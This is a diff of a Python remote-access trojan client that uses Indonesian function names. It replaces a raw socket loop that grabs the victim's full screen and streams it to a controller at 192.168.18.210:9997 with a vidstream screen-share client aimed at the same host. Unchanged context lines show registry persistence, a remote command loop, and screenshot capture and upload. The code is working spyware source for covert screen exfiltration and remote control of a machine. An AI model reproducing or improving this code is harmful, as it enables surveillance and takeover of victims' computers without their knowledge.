@@ -11,9 +11,7 @@ import cv2
 import pickle
 import struct
 import pyautogui
-import pygame
-from PIL import ImageGrab
-import numpy as np
+from vidstream import ScreenShareClient
 import shutil
 import pyaudio
 from pynput.keyboard import Key, Controller
@@ -82,25 +80,14 @@ def  execute_persistence(nama_registry, file_exe):
         pass
 
 def byte_stream_recorder():
-    sop = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sop.connect(('192.168.18.210', 9997))
-
-    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
-    screen = screen.get_size()
-    width = screen[0]
-    height = screen[1]
-
-    while True:
-        img = ImageGrab.grab(bbox=(0,0,width,height))
-        capture = np.array(img)
-        capture = cv2.cvtColor(capture, cv2.COLOR_BGR2RGB)
-        b = pickle.dumps(capture)
-        message = struct.pack("i", len(b))+b
-        sop.sendall(message)
-
-def kirim_byte_stream_recorder():
-    t = threading.Thread(target=byte_stream_recorder)
+    send = ScreenShareClient('192.168.18.210', 9997)
+    
+    t =  threading.Thread(target=send.start_stream)
     t.start()
+
+    while input("") != 'stop':
+          continue
+    send.stop_stream()
 
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -177,7 +164,7 @@ def jalankan_perintah():
             ss.save('ss.png')
             upload_file('ss.png')
         elif perintah == 'screensr':
-            kirim_byte_stream_recorder()
+            byte_stream_recorder()
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
